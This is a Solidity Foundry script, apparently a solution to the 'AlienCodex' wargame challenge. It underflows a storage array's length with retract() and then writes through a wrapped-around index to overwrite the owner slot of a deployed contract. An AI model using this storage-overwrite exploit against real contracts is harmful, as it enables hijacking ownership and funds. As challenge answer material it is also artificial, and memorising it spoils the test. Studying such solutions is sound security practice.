// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract SolverScript is Script {

    IAlienCodex target;

    function setUp() public {
        target = IAlienCodex(0x5a4541CbCb3322E52F05b6d78749684F9Aa584e8);
    }

    function run() public {
        vm.startBroadcast();

        target.makeContact();
        target.retract();
        target.revise(type(uint256).max - uint256(keccak256(abi.encode(1))) + 1, bytes32(uint256(uint160(msg.sender))));

        vm.stopBroadcast();
    }
}
